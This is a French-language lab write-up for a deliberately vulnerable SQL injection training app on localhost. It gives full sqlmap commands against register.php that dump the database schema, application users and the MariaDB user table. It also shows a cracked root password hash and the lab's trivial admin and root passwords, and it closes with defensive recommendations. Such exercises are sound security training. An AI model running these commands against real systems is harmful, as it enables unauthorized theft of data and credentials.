# SQL Injection Training App - Rapport

## Objectif

Ce projet vise à exploiter des vulnérabilités d'injection SQL pour extraire des informations sensibles d'une application web vulnérable. Les objectifs spécifiques sont :

1. **Extraire le schéma de la base de données** et le sauvegarder dans un fichier `.csv`.
2. **Lister les utilisateurs de l'application** et les sauvegarder dans un fichier `.csv`.
3. **Lister les utilisateurs de MariaDB** et les sauvegarder dans un fichier `.csv`.
4. **Obtenir et documenter le mot de passe de l'utilisateur root de MariaDB** par force brute.
5. **Challenge 2 : Obtenir et documenter le mot de passe de l'administrateur de l'application**.

---

## Pré-requis

- **sqlmap** : Outil pour automatiser la détection et l'exploitation des vulnérabilités d'injection SQL.
- **MariaDB** : Système de gestion de base de données utilisé par l'application cible.
- **Accès à l'application web vulnérable**.

---

## Étapes Réalisées

### 1. Identification des Vulnérabilités d'Injection SQL

Lors des tests initiaux, l'insertion d'une apostrophe (`'`) dans le champ `uid` du formulaire `register.php` a généré une erreur SQL, révélant l'utilisation de MariaDB. Nous avons utilisé `sqlmap` pour automatiser le processus d'exploitation.

### 2. Extraction du Schéma de la Base de Données

**Commande utilisée :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
--dbs --batch
```

**Résultat :**

Les bases de données suivantes ont été identifiées :

- `information_schema`
- `mysql`
- `performance_schema`
- `sqlitraining`
- `sys`

Nous avons extrait le schéma de la base de données `sqlitraining` :

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
-D sqlitraining --tables --batch
```

**Tables trouvées :**

- `products`
- `users`

**Dump du schéma dans un fichier `.csv` :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
-D sqlitraining --dump --dump-format=CSV --batch
```

### 3. Liste des Utilisateurs de l'Application

En ciblant la table `users` de la base `sqlitraining`, nous avons extrait les utilisateurs de l'application.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
-D sqlitraining -T users --dump --dump-format=CSV --batch
```

**Résultat :**

Les informations des utilisateurs ont été sauvegardées dans un fichier `.csv`.

### 4. Liste des Utilisateurs de MariaDB

Nous avons ciblé la base de données `mysql`, qui contient les informations des utilisateurs de MariaDB.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
-D mysql -T user --dump --dump-format=CSV --batch
```

**Résultat :**

La liste des utilisateurs de MariaDB a été extraite et sauvegardée dans un fichier `.csv`.

### 5. Récupération du Mot de Passe de l'Utilisateur Root de MariaDB

En examinant les données extraites de la table `user` de la base `mysql`, nous avons récupéré le hachage du mot de passe de l'utilisateur `root`.

**Hachage récupéré :**

```
81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
```

Nous avons utilisé un outil de déchiffrement en ligne pour casser le hachage (par exemple, CrackStation).

**Mot de passe obtenu :**

```
root
```

### 6. Challenge 2 : Récupération du Mot de Passe de l'Administrateur de l'Application

En analysant la table `users` de la base `sqlitraining`, nous avons identifié l'utilisateur administrateur.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
--data="uid=test&password=test&name=test&descr=test" \
-D sqlitraining -T users --dump --dump-format=CSV --batch
```

**Mot de passe de l'administrateur :**

```
admin
```

---

## Fichiers Générés

- **Schéma de la base de données** : `database_schema.csv`
- **Liste des utilisateurs de l'application** : `application_users.csv`
- **Liste des utilisateurs de MariaDB** : `mariadb_users.csv`
- **Mot de passe root de MariaDB** : `mariadb_root_password.txt`
- **Mot de passe administrateur de l'application** : `application_admin_password.txt`

---

## Conclusion

Grâce à l'exploitation des vulnérabilités d'injection SQL présentes dans l'application, nous avons pu extraire des informations sensibles, démontrant l'importance de sécuriser les entrées utilisateur.

---

## Remarques

Pour améliorer la sécurité de l'application, il est recommandé de :

- Utiliser des requêtes préparées (requêtes paramétrées) pour éviter les injections SQL.
- Valider et assainir toutes les entrées utilisateur.
- Mettre à jour régulièrement les systèmes de gestion de base de données et les applications web pour bénéficier des derniers correctifs de sécurité.

---
